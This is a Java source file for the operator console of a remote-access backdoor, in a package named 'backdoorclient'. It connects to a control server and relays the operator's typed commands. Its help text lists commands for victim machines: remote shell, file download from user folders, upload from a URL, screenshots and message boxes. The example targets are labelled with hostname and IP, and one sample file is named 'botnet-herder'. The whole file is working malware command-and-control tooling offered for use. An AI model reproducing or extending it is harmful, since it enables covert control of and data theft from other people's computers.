package backdoorclient;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Base64;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import javax.imageio.ImageIO;

public class Client implements Runnable {

    // Declaration section
    // clientClient: the client socket
    // os: the output stream
    // is: the input stream
    static Socket clientSocket = null;
    static PrintStream os = null;
    static DataInputStream is = null;
    static BufferedReader inputLine = null;
    static boolean closed = false;
    private static String ip = "";
    private static String whoami = "";

    public static void main(String[] args) throws UnknownHostException, InterruptedException {

        // The default port and default ip ( change localhost in your ip )
        int port_number = 4600;
        String host = "localhost";

        String hostname = InetAddress.getLocalHost().getHostName(); // find the hostname from computer
		ip = "noip";
        whoami = "Admin@" + ip;

        System.out.println("Connecting to " + host + " on port " + port_number + "...");

        try {
            clientSocket = new Socket(host, port_number);
            inputLine = new BufferedReader(new InputStreamReader(System.in));
            os = new PrintStream(clientSocket.getOutputStream());
            is = new DataInputStream(clientSocket.getInputStream());
        } catch (UnknownHostException e) {
            System.err.println("Don't know about host " + host);
        } catch (IOException e) {
            System.err.println("Couldn't get I/O for the connection to the host " + host);
        }
        if (clientSocket != null && os != null && is != null) {
            try {
                System.out.println("welkom admin here is a list with all the options and how to work with them: "
                        + "msgbox, download, upload, shell, screenshot, javaversion and exit you have to give the hostname and external ip to send to someone here some examples you can find the hostname and external ip easy with list info : \n"
                        + "Examples:\n"
                        + "minepc@1.2.3.4 shell dir C:\\\n"
                        + "minepc@1.2.3.4 msgbox hello\n"
                        + "minepc@1.2.3.4 download C:\\Users\\mh123hack\\Downloads\\botnet-herder.jpg\n"
                        + "minepc@1.2.3.4 upload http://thestartupmag.com/wp-content/uploads/2016/10/hacked.png\n"
                        + "minepc@1.2.3.4 screenshot\n"
                        + "minepc@1.2.3.4 javaversion\n"
                        + "minepc@1.2.3.4 exit\n"
                        + "list info");
                new Thread(new Client()).start();

                while (!closed) {
                    // read one line text.
                    int a = 'a';
                    String s = "";
                    long begin = System.currentTimeMillis();
                    do {
                        if (System.currentTimeMillis() - begin > 10000) { // keepalive message.
                            begin = System.currentTimeMillis();
                            os.println("ping");
                        }
                        if (inputLine.ready()) { // reading line.
                            a = inputLine.read();
                            if (a != 10) {
                                s = s + (char) a;
                            }
                        }
                    } while (a != 10);
                    os.println(s);

                }

                os.close();
                is.close();
                clientSocket.close();
            } catch (IOException e) {
                System.err.println("IOException:  " + e);
            }
        }
    }

    public void run() {
        String responseLine;

        try {
            while ((responseLine = is.readLine()) != null) { // this is the line witch you have written to the server and came back from the server.
                System.out.println(responseLine);

            }

        } catch (IOException e) {
            System.err.println("IOException:  " + e);

        }

        System.err.println("Connection lost with server");
        closed = true;

    }
}
